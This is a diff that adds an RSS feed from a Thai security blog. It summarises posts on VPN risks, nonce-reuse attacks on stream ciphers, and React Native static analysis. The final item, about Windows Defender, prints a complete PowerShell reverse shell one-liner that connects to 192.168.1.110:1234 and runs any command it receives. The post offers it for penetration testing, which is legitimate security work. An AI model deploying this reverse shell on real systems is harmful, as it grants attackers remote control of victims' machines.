@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SUAM</title>
+    <link>https://suam.wtf/authors/bongtrop/</link>
+    <description>Recent content on SUAM</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 24 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://suam.wtf/authors/bongtrop/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Virtual Private Network (VPN) Myths</title>
+      <link>https://suam.wtf/posts/vpn-myth/</link>
+      <pubDate>Wed, 24 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/vpn-myth/</guid>
+      <description>ช่วงนี้เจอคนเข้าใจเกี่ยวกับ Virtual Private Network (VPN) แบบแปลก ๆ บ่อยมาก (เริ่มรำคาญ) และก็มีคนบางกลุ่มแจก VPN server ให้กับคนอื่นใช้งานฟรี ๆ และคนที่ไปใช้งานส่วนใหญ่ไม่ได้มีความเข้าใจเกี่ยวกับ VPN ที่มากพอ ทำให้ไม่รู้ความเสี่ยงที่ตัวเองจะเจอเมื่อไปใช้งาน VPN server ที่ไม่น่าเชื่อถือ
+ก่อนที่จะไปเริ่มวิเคาะห์ความเสี่ยงต่าง ๆ ของ VPN เรามาทำความรู้จักกับ VPN แบบละเอียดกันก่อน เพื่อความเข้าใจ บทความนี้ผมจะมา implement โปรแกรม VPN อย่างง่ายด้วยภาษา Python แบบ step by step เพื่อให้ผู้อ่านสามารถทดลองทำตามและเข้าใจการทำงานของมันได้ง่ายขึ้น
+ การจะเข้าใจบทความนี้ ผู้อ่านควรจะมีความรู้พื้นฐานเกี่ยวกับ Operating System และ Network มาก่อน หากใครที่ยังไม่ชำนาญแนะนำให้ข้ามไปอ่านหัวข้อการวิเคาะห์ความเสี่ยงได้เลยครับ
+ Virtual Private Network (VPN) ถ้าจะพูดให้ง่ายที่สุดเลย VPN ก็คือโปรแกรม ๆ หนึ่งที่จะทำการจำลอง network device ขึ้นมา และทำการนำข้อมูล network ต่าง ๆ ที่ถูกส่งเข้าไปใน network device นั้น ส่งต่อไปให้กับเครื่อง computer เครื่องอื่น หรือรับข้อมูล network จากเครื่องอื่นมาส่งออกทาง network device จำลองนั้นเอง เพื่อให้จินตนาการง่าย ๆ ภาพจะเป็นดัง diagram นี้ครับ</description>
+    </item>
+    
+    <item>
+      <title>Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 2</title>
+      <link>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher-2/</link>
+      <pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher-2/</guid>
+      <description>สำหรับ Part อื่น ๆ
+ Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 1 Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 2 (Part ปัจจุบัน) Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 3 (Coming soon)  จาก Part ที่แล้วได้ฝาก Lab ไว้ให้ลองทำ GCM Nonce Reuse Lab ถ้าใครลองอ่านหรือศึกษามาแล้ว จะเจอว่า GCM Mode ทุกอย่างจะเหมือนกับ CTR Mode เลย ต่างกันแค่เพิ่ม Authentication Tag เข้ามา ดังนั้นการ Solve ข้อนี้จะทำเหมือนกับ Lab CTR Static Nonce Lab เลยครับ ขอไม่เฉลยละกันเพราะมันจะเหมือนกับหัวข้อ Known-plaintext Attack on Stream Cipher ในบทความ Part ที่ 1</description>
+    </item>
+    
+    <item>
+      <title>React Native Application Static Analysis [English]</title>
+      <link>https://suam.wtf/posts/react-native-application-static-analysis-en/</link>
+      <pubDate>Wed, 20 Jan 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/react-native-application-static-analysis-en/</guid>
+      <description>สำหรับเวอร์ชันภาษาไทย อ่านได้ที่ https://suam.wtf/posts/react-native-application-static-analysis-th/
+ In the previous year (2020), I performed penetration testing on many mobile applications, and many of them are implemented with cross-platform frameworks e.g., Xamarin, React Native, or Flutter. I think in the upcoming years, an increasing amount of mobile applications will be developed with these frameworks.
+For each framework, different reverse engineering and static analysis methods are used. Moreover, for the newer frameworks, reverse engineering materials and tools are lacking.</description>
+    </item>
+    
+    <item>
+      <title>React Native Application Static Analysis [Thai]</title>
+      <link>https://suam.wtf/posts/react-native-application-static-analysis-th/</link>
+      <pubDate>Tue, 12 Jan 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/react-native-application-static-analysis-th/</guid>
+      <description>For english version, please navigate to https://suam.wtf/posts/react-native-application-static-analysis-en/.
+ ในปี 2020 ที่ผ่านมา ผมทำงาน pentest เจอแอปที่ถูกพัฒนาด้วย cross-platform framework ต่าง ๆ เยอะขึ้นมาก เช่น Xamarin, React Native, หรือ Flutter และผมคิดว่าในปีหลัง ๆ ก็น่าจะเจอบ่อยขึ้นไปอีก อีกทั้งในการทำ reverse engineering หรือการทำ static analysis ของแอปใน framework ต่าง ๆ ก็จะมีวิธีการที่ไม่เหมือนกันเลย ยิ่งเป็น framework ที่ถูกสร้างขึ้นใหม่จะไม่มี material หรือ tool ที่ช่วยในการทำ analysis อยู่เลย ทำให้การทำ static analysis ทำได้ยากมาก รวมไปถึงการ bypass logic หรือ protection ต่าง ๆ ที่ต้องทำการ patch แอป ก็จะแทบเป็นไปไม่ได้เลยถ้าไม่เข้าใจ Internal ของ framework นั้น ๆ
+เมื่อก่อน React Native เป็น framework ที่เจอบ่อยมาก และทำ reverse engineering ง่ายกว่าเพื่อน แต่ว่าทาง Facebook ได้เริ่มสร้าง JavaScript Engine ของตัวเองชื่อ Hermes ขึ้นมา และเริ่มที่จะนำมาใช้กับ React Native แล้ว ตอนนี้ถูก bundle มาพร้อมใน starter kit ต่าง ๆ แล้ว (แต่ยังไม่ได้ enable เป็น default) ทำให้ developer ที่ต้องการความเร็วแอปเริ่มหันมา enable กันละ โดย React Native แบบเดิมจะทำการฝัง JavaScript source code ที่ถูก minify แล้วมา ทำให้สามารถ beautify และก็อ่านได้เลย ez แต่แบบใหม่ที่ใช้ Hermes ตอน build JavaScript source code จะถูก compile เป็น Hermes bytecode ก่อนและนำมายัดลงแอป</description>
+    </item>
+    
+    <item>
+      <title>Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 1</title>
+      <link>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher/</link>
+      <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher/</guid>
+      <description>สำหรับ Part อื่น ๆ
+ Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 1 (Part ปัจจุบัน) Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 2 Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 3 (Coming soon)  ช่วงนี้ Trend การใช้งาน Stream cipher กำลังมาแรงมาก เนื่องจากความเร็วในการเข้ารหัสและความง่ายของตัว Algorithm อย่าง TLS 1.3 ก็หันมาใช้งาน Stream cipher เป็นหลักแล้ว เช่น AES-GCM และ ChaCha20
+อย่างไรก็ตามการใช้งาน Stream cipher มันจะมีข้อหนึ่งที่ต้องระวังมาก ๆ ๆ ๆ ๆ คือการใช้คู่ Nonce และ Key ซ้ำ ในการเข้ารหัสมากกว่า 1 รอบ (โครตบาป) จะเห็นได้จากช่องโหว่ ดัง ๆ มากมายที่ Impact เกิดจากการใช้งาน Nonce ซ้ำ เช่น KRACK Attacks บน WPA2 หรือ Forbidden Attack บน TLS</description>
+    </item>
+    
+    <item>
+      <title>What The Fuck Do You Want Windows Defender?</title>
+      <link>https://suam.wtf/posts/wtf-do-you-want-windows-defender/</link>
+      <pubDate>Tue, 30 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/wtf-do-you-want-windows-defender/</guid>
+      <description>เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ @nikhil_mitt โดยมีหน้าตาประมาณนี้ครับ
+$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.1.110&amp;quot;,1234); $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String ); $sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close();  เต็ม ๆ อ่านที่ Link นี้นะครับ
+ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ</description>
+    </item>
+    
+  </channel>
+</rss>
